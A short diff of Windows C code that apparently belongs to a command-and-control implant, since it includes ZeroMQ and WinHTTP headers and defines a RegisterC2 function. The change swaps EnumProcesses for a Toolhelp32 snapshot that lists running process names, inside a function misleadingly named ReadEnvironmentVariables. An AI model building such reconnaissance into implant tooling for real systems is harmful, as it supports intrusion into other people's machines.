@@ -20,27 +20,25 @@
 #include <windows.h>
 #include <stdio.h>
 #include <winhttp.h>
-#include <Psapi.h>
+#include <tlhelp32.h>
 #include <zmq.h>
 
+// Print all running processes
 void ReadEnvironmentVariables(){
-    DWORD* pidList = (DWORD*)malloc(sizeof(DWORD) * 200);
-    LPDWORD dataRead = (LPDWORD)malloc(sizeof(DWORD));
-    BOOL success = EnumProcesses(
-        pidList,
-        200*sizeof(DWORD),
-        dataRead
-    );
-    
-    if(success){
-        // TODO: Add check to see if dataRead is maximum size of pid list, meaning there is more processes to list
-        long size = *dataRead / sizeof(DWORD);
-        for(int i = 0; i < size; i++){
-            printf("Proc PID: %d\n", pidList[i]);
-        }     
-    }else{
-        printf("failure: %d\n", GetLastError());
+    HANDLE hSnap;
+    PROCESSENTRY32 ProcessStruct;
+    ProcessStruct.dwSize = sizeof(PROCESSENTRY32);
+    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if(hSnap == INVALID_HANDLE_VALUE){
+        printf("Snapshot failure: %d\n", GetLastError());
     }
+    if(Process32First(hSnap, &ProcessStruct) == FALSE){
+        printf("Snapshot failure: %d\n", GetLastError());
+    }
+    do{
+        printf("%s\n", ProcessStruct.szExeFile);
+    }while(Process32Next(hSnap, &ProcessStruct));
+    CloseHandle(hSnap);
 }
 
 void RegisterC2(_TCHAR* gid){
